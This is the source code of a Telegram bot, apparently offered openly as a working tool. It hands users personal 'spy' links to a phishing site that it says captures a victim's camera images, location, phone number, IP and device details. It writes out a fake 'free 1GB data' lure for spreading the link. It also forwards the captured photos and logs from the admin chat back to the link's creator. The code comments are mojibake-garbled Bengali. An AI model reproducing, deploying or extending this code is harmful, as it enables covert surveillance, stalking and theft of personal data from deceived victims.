import logging
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
import os

# --- ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶® (‡¶è‡¶®‡¶≠‡¶æ‡¶Ø‡¶º‡¶∞‡¶®‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶≠‡ßá‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶¨‡¶≤ ‡¶•‡ßá‡¶ï‡ßá ‡¶≤‡ßã‡¶° ‡¶π‡¶¨‡ßá) ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL")

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"  # ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï
OWNER_USERNAME = "https://t.me/TheSagorOfficial"  # ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶®‡ßç‡¶ü‡¶æ‡¶ï‡ßç‡¶ü ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶®‡ßá‡¶Æ

# ‡¶≤‡¶ó‡¶ø‡¶Ç ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- ‡¶∏‡ßç‡¶ü‡¶æ‡¶∞‡ßç‡¶ü ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ---
async def start(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! üéâ\n\n"
        "ùó¨ùóºùòÇ ùó∞ùóÆùóª ùóõùóÆùó∞ùó∏ :\n"
        "üîπ Front Camera\n"
        "üîπ Back Camera\n"
        "üîπ Location with map\n"
        "üîπ Phone number\n"
        "üîπ Sim Type\n"
        "üîπ IP, Battery, and many more\n"
        "üîπ Device type\n\n"
        "ùó°ùóºùòÅùó≤: ùóúùòÅ ùó∂ùòÄ ùóºùóªùóπùòÜ ùó≥ùóºùóø ùó≥ùòÇùóª ùóÆùóªùó± ùó≤ùó±ùòÇùó∞ùóÆùòÅùó∂ùóºùóªùóÆùóπ ùóΩùòÇùóøùóΩùóºùòÄùó≤ùòÄ üí°\n\n"
        "Now press create button to generate your link. üòä"
    )
    
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

# --- ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶è‡¶¨‡¶Ç /create ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ---
async def create_link_handler(update: Update, context: CallbackContext) -> None:
    # ‡¶è‡¶ü‡¶ø ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶è‡¶¨‡¶Ç /create ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶â‡¶≠‡¶Ø‡¶º ‡¶•‡ßá‡¶ï‡ßá‡¶á ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá
    user_id = update.effective_user.id
    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    
    message_text = (
        "üéâ ùó¨ùóºùòÇùóø ùó®ùóªùó∂ùóæùòÇùó≤ ùóßùóøùóÆùó∞ùó∏ùó∂ùóªùó¥ ùóüùó∂ùóªùó∏ ùó∂ùòÄ ùó•ùó≤ùóÆùó±ùòÜ! üéâ\n\n"
        f"üîó ùó¨ùóºùòÇùóø ùóüùó∂ùóªùó∏: `{personal_link}`\n\n"
        "üìùùó°ùóºùòÅùó≤‚ö†\n\n"
        "->This bot ùó®ùó•ùóü not work complete on telegram web\n\n"
        "->So Use this ùó®ùó•ùóü on chrome or others browsers.‚úÖ\n\n"
        "Feel The power üí™‚ö° of sagor Sheikh üòé"
    )
    
    # ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶§‡ßà‡¶∞‡¶ø
    share_text = (
        "üåüùóòùòÖùó∞ùóπùòÇùòÄùó∂ùòÉùó≤ ùó¢ùó≥ùó≥ùó≤ùóø: ùóñùóπùóÆùó∂ùó∫ ùó¨ùóºùòÇùóø ùóôùóøùó≤ùó≤ ùü≠ùóöùóï ùóóùóÆùòÅùóÆ!üåü\n\n"
        "Looking for a quick internet boost? üéÅ\n"
        "Enjoy 1GB of free internet üåç‚ú®!\n\n"
        "‚ú® ùóñùóπùóÆùó∂ùó∫ ùòÜùóºùòÇùóø ùóôùó•ùóòùóò ùü≠ùóöùóï ùóªùóºùòÑ! üöÄ\n\n"
        f"üëâùóöùó≤ùòÅ Your ùóôùóøùó≤ùó≤ ùü≠ùóöùóï\n"
        f"üëâ{personal_link}\n\n"
        "Don't wait, ùóπùó∂ùó∫ùó∂ùòÅùó≤ùó± ùòÅùó∂ùó∫ùó≤ ùóºùó≥ùó≥ùó≤ùóø!"
    )
    # ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶´‡¶∞‡ßã‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶° ‡¶≤‡¶ø‡¶Ç‡¶ï‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø URL ‡¶è‡¶®‡¶ï‡ßã‡¶° ‡¶ï‡¶∞‡¶æ
    telegram_share_url = f"https://t.me/share/url?url=&text={share_text.replace(' ', '%20').replace('\n', '%0A')}"

    # ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶æ‡¶ü‡¶®‡¶ó‡ßÅ‡¶≤‡ßã ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # ‡¶¨‡¶æ‡¶ü‡¶® ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï‡ßá‡¶∞ ‡¶ï‡ßç‡¶∑‡ßá‡¶§‡ßç‡¶∞‡ßá ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶è‡¶°‡¶ø‡¶ü ‡¶ï‡¶∞‡¶æ, /create ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡ßá‡¶∞ ‡¶ï‡ßç‡¶∑‡ßá‡¶§‡ßç‡¶∞‡ßá ‡¶®‡¶§‡ßÅ‡¶® ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã
    if update.callback_query:
        await update.callback_query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

# --- ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶´‡¶ø‡¶≤‡ßç‡¶ü‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶á‡¶û‡ßç‡¶ú‡¶ø‡¶® (‡¶Ö‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡¶ø‡¶§) ---
async def message_filter(update: Update, context: CallbackContext) -> None:
    if update.message.chat.type != 'private' or update.message.chat_id != int(ADMIN_CHAT_ID):
        return

    text = update.message.text
    photo_caption = update.message.caption
    message_content = text or photo_caption
    if not message_content:
        return

    match = re.search(r'\[student_id=(\d+)\]', message_content)
    if not match:
        return

    student_id = match.group(1)
    clean_message = re.sub(r'\[student_id=\d+\]\s*', '', message_content).strip()

    try:
        if update.message.photo:
            await context.bot.send_photo(chat_id=student_id, photo=update.message.photo[-1].file_id, caption=clean_message, parse_mode='Markdown')
            logger.info(f"Photo sent to student {student_id}")
        elif clean_message:
            await context.bot.send_message(chat_id=student_id, text=clean_message, parse_mode='Markdown')
            logger.info(f"Text log sent to student {student_id}")
            
    except Exception as e:
        logger.error(f"Failed to send message to student {student_id}. Error: {e}")
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"‚ö†Ô∏è **Failed to deliver log to student `{student_id}`.** They might have blocked the bot.", parse_mode='Markdown')

# --- ‡¶Æ‡ßÇ‡¶≤ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ---
def main() -> None:
    application = Application.builder().token(TOKEN).build()

    # ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶è‡¶¨‡¶Ç ‡¶¨‡¶æ‡¶ü‡¶® ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("create", create_link_handler))
    application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
    
    # ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶´‡¶ø‡¶≤‡ßç‡¶ü‡¶æ‡¶∞ ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ
    application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))

    logger.info("Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
